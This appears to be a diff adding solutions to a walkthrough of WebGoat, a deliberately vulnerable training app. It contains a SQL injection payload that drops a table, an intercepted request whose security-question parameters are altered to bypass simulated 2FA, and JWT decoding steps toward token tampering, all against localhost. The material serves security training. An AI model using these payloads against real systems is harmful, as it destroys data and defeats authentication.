@@ -422,3 +422,96 @@ Delete the `access_log` table.
 ```sql
 "'; DROP TABLE access_log -- -
 ```
+
+### Notice
+
+All other tasks of the Injection chapter are not required.
+Because of this, solutions will be added later.
+
+# (A2) Broken Authentication
+
+## Authentication Bypasses
+
+### Task 1
+
+No andwer needed.
+
+### Task 2
+
+Intercept the POST request with a proxy of your chaoice:
+
+```
+POST /WebGoat/auth-bypass/verify-account HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 84
+Origin: http://localhost:8080
+Connection: close
+Referer: http://localhost:8080/WebGoat/start.mvc
+Cookie: JSESSIONID=7UAjP5LPBz1TN8T-wzcu1pZDAJSKTguUiX6pbW6m
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+secQuestion0=a&secQuestio1n=b&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
+```
+
+Change the parameters `secQuestion0` and `secQuestion1` to `secQuestion2` and `secQuestion3` and send the request.
+This will successfully circumvent the simulated 2FA.
+
+## JWT Tokens
+
+### Task 1
+
+No answer needed.
+
+### Task 2
+
+No answer needed.
+
+### Task 3
+
+The given token can be base64-decoded with any normal tool.
+
+Here is one of the possible methods:
+
+```bash
+echo "<token>" | tr '.' '\n' | base64 -d
+```
+
+The username is `user`.
+
+### Task 4
+
+No answer needed.
+
+### Task 5
+
+Change the logged in user to `Tom` in the top right of the task frame.
+
+![Vote Fraud Step 1](.img/vote_fraud_1.png)
+
+Intercept the request.
+
+![Vote Fraud Step 2](.img/vote_fraud_2.png)
+
+Extract the token from the `access_token` cookie:
+
+```
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2OTgzMT
+I4NjUsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiV
+G9tIn0.tkzPdgC90zJDBeuhogbrky_Z47fgl8g0
+Bdvx795EA--O7co79r00lax3P47xQijFV2f28G0
+a6DL_mduk4x0wqQ
+```
+
+Split the token into its parts and decode it.
+Note, that a decoding error at the end of the payload string has been fixed manually by appending a missing `=`
+at the end of the payload string.
+
+![Vote Fraud Step 3](.img/vote_fraud_3.png)
